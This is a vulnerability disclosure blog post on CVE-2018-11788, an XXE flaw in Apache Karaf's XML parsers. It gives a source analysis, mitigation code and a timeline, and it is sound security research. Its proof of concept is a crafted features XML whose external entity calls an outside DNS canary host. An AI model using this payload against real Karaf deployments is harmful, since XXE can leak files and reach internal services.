@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		APACHE KARAF XXE VULNERABILITY (CVE-2018-11788) -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">APACHE KARAF XXE VULNERABILITY (CVE-2018-11788)</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">06 Jan 2019 - avfisher</p>
+
+<h2 id="summary">Summary</h2>
+
+<p>   Apache Karaf is a modern and polymorphic applications container. It’s a lightweight, powered, and enterprise ready container powered by OSGi. Apache Karaf is a “product project”, providing a complete and turnkey runtime. The runtime is “multi-facets”, meaning that you can deploy different kind of applications: OSGi or non OSGi, webapplication, services based, etc.</p>
+
+<p>   In a recent research on Apache Karaf, I found some XXE (XML eXternal Entity injection) vulnerabilities existed on its XML parsers. It is caused that the parsers improperly parse XML document.</p>
+
+<h2 id="affected-version">Affected version</h2>
+
+<ul>
+  <li>Apache Karaf &lt;= 4.2.1</li>
+  <li>Apache Karaf &lt;= 4.1.6</li>
+</ul>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>   According to the <a href="https://karaf.apache.org/manual/latest/#_deployer" target="_blank">official manual</a>, Apache Karaf provides a features deployer by default, which allows users to “hot deploy” a features XML by dropping the file directly in the deploy folder.</p>
+
+<p>When you drop a features XML in the deploy folder, the features deployer does:</p>
+
+<ul>
+  <li>register the features XML as a features repository</li>
+  <li>the features with install attribute set to “auto” will be automatically installed by the features deployer.</li>
+</ul>
+
+<p>For instance, dropping the following XML in the deploy folder will automatically install feature1 and feature2, whereas feature3 won’t be installed:</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;features</span> <span class="na">name=</span><span class="s">"my-features"</span> <span class="na">xmlns=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xsi:schemaLocation=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;feature</span> <span class="na">name=</span><span class="s">"feature1"</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">install=</span><span class="s">"auto"</span><span class="nt">&gt;</span>
+        ...
+    <span class="nt">&lt;/feature&gt;</span>
+    <span class="nt">&lt;feature</span> <span class="na">name=</span><span class="s">"feature2"</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">install=</span><span class="s">"auto"</span><span class="nt">&gt;</span>
+        ...
+    <span class="nt">&lt;/feature&gt;</span>
+    <span class="nt">&lt;feature</span> <span class="na">name=</span><span class="s">"feature3"</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+        ...
+    <span class="nt">&lt;/feature&gt;</span>
+<span class="nt">&lt;/features&gt;</span></code></pre></figure>
+
+<p>In order to learn how deployer handle the XML file, I checked the source codes of Karaf in Github and found the invocations as follows:</p>
+
+<ul>
+  <li>Activatorclass invokes <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/osgi/Activator.java#L38" target="_blank">doStart()</a> function to start a listener for deployer</li>
+  <li>doStart() function invokes <a href="_blank">FeatureDeploymentListener.init()</a> to initial a listener</li>
+  <li>Then it calls function <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L180" target="_blank">bundleChanged</a> – <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L145" target="_blank">canHandle</a> – <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258" target="_blank">getRootElementName</a> to parse XML document by leveraging <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/specs/java.xml/src/main/java/javax/xml/stream/XMLInputFactory.java" target="_blank">XMLInputFactory</a></li>
+</ul>
+
+<p>But upon further investigation on function <code class="highlighter-rouge">getRootElementName</code> as below, there is no any prevention against XXE.</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="n">QName</span> <span class="nf">getRootElementName</span><span class="o">(</span><span class="n">File</span> <span class="n">artifact</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">xif</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">xif</span> <span class="o">=</span> <span class="n">XMLInputFactory</span><span class="o">.</span><span class="na">newFactory</span><span class="o">();</span>
+        <span class="n">xif</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="n">XMLInputFactory</span><span class="o">.</span><span class="na">IS_NAMESPACE_AWARE</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">try</span> <span class="o">(</span><span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">artifact</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">XMLStreamReader</span> <span class="n">sr</span> <span class="o">=</span> <span class="n">xif</span><span class="o">.</span><span class="na">createXMLStreamReader</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
+        <span class="n">sr</span><span class="o">.</span><span class="na">nextTag</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">sr</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Therefore, I assumed it posed a potential security risk for Apache Karaf.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In order to verify my assumption, I tested on the latest official release of Apache Karaf 4.2.0 which was downloaded from <a href="https://karaf.apache.org/download.html" target="_blank">https://karaf.apache.org/download.html</a> as follows.</p>
+
+<p>1 - Download the binary distribution from <a href="http://www.apache.org/dyn/closer.lua/karaf/4.2.0/apache-karaf-4.2.0.tar.gz" target="_blank">Apache Karaf 4.2.0</a></p>
+
+<p>2 - Uncompress the package and locate to folderbinto start Karaf command console as shown below</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">bin</span><span class="err">$</span> <span class="o">./</span><span class="n">karaf</span>
+      <span class="n">__</span> <span class="n">__</span>                  <span class="n">____</span>      
+     <span class="o">/</span> <span class="c1">//_/____ __________ _/ __/      </span>
+    <span class="o">/</span> <span class="o">,&lt;</span>  <span class="o">/</span> <span class="n">__</span> <span class="err">`</span><span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> <span class="err">`</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>        
+   <span class="o">/</span> <span class="o">/|</span> <span class="o">|/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span>        
+  <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="err">\</span><span class="n">__</span><span class="o">,</span><span class="n">_</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   <span class="err">\</span><span class="n">__</span><span class="o">,</span><span class="n">_</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>         
+
+<span class="n">Apache</span> <span class="nf">Karaf</span> <span class="o">(</span><span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span><span class="o">)</span>
+
+<span class="n">Hit</span> <span class="err">'</span><span class="o">&lt;</span><span class="n">tab</span><span class="o">&gt;</span><span class="err">'</span> <span class="k">for</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">commands</span>
+<span class="n">and</span> <span class="err">'</span><span class="o">[</span><span class="n">cmd</span><span class="o">]</span> <span class="o">--</span><span class="n">help</span><span class="err">'</span> <span class="k">for</span> <span class="n">help</span> <span class="n">on</span> <span class="n">a</span> <span class="n">specific</span> <span class="n">command</span><span class="o">.</span>
+<span class="n">Hit</span> <span class="err">'</span><span class="o">&lt;</span><span class="n">ctrl</span><span class="o">-</span><span class="n">d</span><span class="o">&gt;</span><span class="err">'</span> <span class="n">or</span> <span class="n">type</span> <span class="err">'</span><span class="nl">system:</span><span class="n">shutdown</span><span class="err">'</span> <span class="n">or</span> <span class="err">'</span><span class="n">logout</span><span class="err">'</span> <span class="n">to</span> <span class="n">shutdown</span> <span class="n">Karaf</span><span class="o">.</span>
+
+<span class="n">karaf</span><span class="nd">@root</span><span class="o">()&gt;</span></code></pre></figure>
+
+<p>3 - Generate a DNS token on <a href="https://canarytokens.org/generate" target="_blank">https://canarytokens.org/generate</a>, e.g.27av6zyg33g8q8xu338uvhnsc.canarytokens.com</p>
+
+<p>4 - Craft a XML file and add an external entity with the generated DNS token embedded in DTDs as below:</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"&gt;</span> %dtd;]
+<span class="nt">&lt;features</span> <span class="na">name=</span><span class="s">"my-features"</span> <span class="na">xmlns=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        <span class="na">xsi:schemaLocation=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;feature</span> <span class="na">name=</span><span class="s">"deployer"</span> <span class="na">version=</span><span class="s">"2.0"</span> <span class="na">install=</span><span class="s">"auto"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/feature&gt;</span>
+<span class="nt">&lt;/features&gt;</span></code></pre></figure>
+
+<p>5 - Copy the crafted XML file under folder deploy:</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">apache</span><span class="o">-</span><span class="n">karaf</span><span class="o">-</span><span class="mf">4.2</span><span class="o">.</span><span class="mi">0</span><span class="err">$</span> <span class="n">cd</span> <span class="n">deploy</span><span class="o">/</span>
+<span class="n">deploy</span><span class="err">$</span> <span class="n">tree</span>
+<span class="o">.</span>
+<span class="err">├──</span> <span class="n">README</span>
+<span class="err">└──</span> <span class="n">poc</span><span class="o">.</span><span class="na">xml</span></code></pre></figure>
+
+<p>6 - Wait for a while, and then you will see the DNS requests from your testing machine, which means the XML parser is trying to load external entities embedded in DTDs.</p>
+
+<p><img src="https://i.loli.net/2019/01/26/5c4c5f19efd1c.png" /></p>
+
+<h2 id="mitigation">Mitigation</h2>
+
+<p>Follow the OWASP guide below which provides concise information to prevent this vulnerability. <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java" target="_blank">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p>
+
+<p>For instance, adding codes below to disable DTDs and external entities in function <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258" target="_blank">getRootElementName</a>.</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">xif</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="n">XMLInputFactory</span><span class="o">.</span><span class="na">SUPPORT_DTD</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span> <span class="c1">// This disables DTDs entirely for that factory</span>
+<span class="n">xif</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"javax.xml.stream.isSupportingExternalEntities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span> <span class="c1">// disable external entities</span></code></pre></figure>
+
+<h2 id="extra-information">Extra information</h2>
+
+<p>Apart from the finding mentioned above, I also found another class XmlUtils in Apache Karaf project didn’t add any protection from XXE vulnerability when parsing XML document.</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">karaf</span><span class="o">.</span><span class="na">util</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Result</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Source</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerFactory</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.w3c.dom.Document</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.xml.sax.ErrorHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
+
+<span class="cm">/**
+ * Utils class to manipulate XML document in a thread safe way.
+ */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">XmlUtils</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">DocumentBuilderFactory</span><span class="o">&gt;</span> <span class="n">DOCUMENT_BUILDER_FACTORY</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ThreadLocal</span><span class="o">&lt;&gt;();</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">TransformerFactory</span><span class="o">&gt;</span> <span class="n">TRANSFORMER_FACTORY</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ThreadLocal</span><span class="o">&lt;&gt;();</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">SAXParserFactory</span><span class="o">&gt;</span> <span class="n">SAX_PARSER_FACTORY</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ThreadLocal</span><span class="o">&lt;&gt;();</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Document</span> <span class="nf">parse</span><span class="o">(</span><span class="n">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">ParserConfigurationException</span> <span class="o">{</span>
+        <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">documentBuilder</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">db</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Document</span> <span class="nf">parse</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">stream</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">ParserConfigurationException</span> <span class="o">{</span>
+        <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">documentBuilder</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">stream</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">db</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Document</span> <span class="nf">parse</span><span class="o">(</span><span class="n">File</span> <span class="n">f</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">ParserConfigurationException</span> <span class="o">{</span>
+        <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">documentBuilder</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">db</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Document</span> <span class="nf">parse</span><span class="o">(</span><span class="n">File</span> <span class="n">f</span><span class="o">,</span> <span class="n">ErrorHandler</span> <span class="n">errorHandler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">ParserConfigurationException</span> <span class="o">{</span>
+        <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">documentBuilder</span><span class="o">();</span>
+        <span class="n">db</span><span class="o">.</span><span class="na">setErrorHandler</span><span class="o">(</span><span class="n">errorHandler</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">db</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Source</span> <span class="n">xmlSource</span><span class="o">,</span> <span class="n">Result</span> <span class="n">outputTarget</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span> <span class="o">{</span>
+        <span class="n">Transformer</span> <span class="n">t</span> <span class="o">=</span> <span class="n">transformer</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">xmlSource</span><span class="o">,</span> <span class="n">outputTarget</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Source</span> <span class="n">xsltSource</span><span class="o">,</span> <span class="n">Source</span> <span class="n">xmlSource</span><span class="o">,</span> <span class="n">Result</span> <span class="n">outputTarget</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerException</span> <span class="o">{</span>
+        <span class="n">Transformer</span> <span class="n">t</span> <span class="o">=</span> <span class="n">transformer</span><span class="o">(</span><span class="n">xsltSource</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">xmlSource</span><span class="o">,</span> <span class="n">outputTarget</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">reset</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">XMLReader</span> <span class="nf">xmlReader</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span> <span class="o">{</span>
+        <span class="n">SAXParserFactory</span> <span class="n">spf</span> <span class="o">=</span> <span class="n">SAX_PARSER_FACTORY</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">spf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">spf</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">spf</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">SAX_PARSER_FACTORY</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">spf</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">spf</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">().</span><span class="na">getXMLReader</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">DocumentBuilder</span> <span class="nf">documentBuilder</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span> <span class="o">{</span>
+        <span class="n">DocumentBuilderFactory</span> <span class="n">dbf</span> <span class="o">=</span> <span class="n">DOCUMENT_BUILDER_FACTORY</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">dbf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">dbf</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">dbf</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">DOCUMENT_BUILDER_FACTORY</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">dbf</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">dbf</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Transformer</span> <span class="nf">transformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>
+        <span class="n">TransformerFactory</span> <span class="n">tf</span> <span class="o">=</span> <span class="n">TRANSFORMER_FACTORY</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">tf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">tf</span> <span class="o">=</span> <span class="n">TransformerFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">TRANSFORMER_FACTORY</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tf</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">tf</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="n">Transformer</span> <span class="nf">transformer</span><span class="o">(</span><span class="n">Source</span> <span class="n">xsltSource</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>
+        <span class="n">TransformerFactory</span> <span class="n">tf</span> <span class="o">=</span> <span class="n">TRANSFORMER_FACTORY</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">tf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">tf</span> <span class="o">=</span> <span class="n">TransformerFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">TRANSFORMER_FACTORY</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tf</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">tf</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">(</span><span class="n">xsltSource</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="o">}</span></code></pre></figure>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+  <li>2018-08-22: Reported this issue to Apache Security team.</li>
+  <li>2018-09-26: Apache Karaf team confirmed and fixed the issue in <a href="https://issues.apache.org/jira/browse/KARAF-5911" target="_blank">KARAF-5911</a>.</li>
+  <li>2018-11-30: Apache Karaf 4.1.7 was released with the fix.</li>
+  <li>2018-12-18: Apache Karaf 4.2.2 was released with the fix.</li>
+  <li>2019-01-06: Apache Karaf announced CVE-2018-11788 on this issue.</li>
+</ul>
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+  <li>https://karaf.apache.org/security/cve-2018-11788.txt</li>
+  <li>https://issues.apache.org/jira/browse/KARAF-5911</li>
+  <li>https://gitbox.apache.org/repos/asf?p=karaf.git;h=cc3332e</li>
+  <li>https://gitbox.apache.org/repos/asf?p=karaf.git;h=1ffa6d1</li>
+  <li>https://github.com/brianwrf/CVE-2018-11788</li>
+</ul>
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
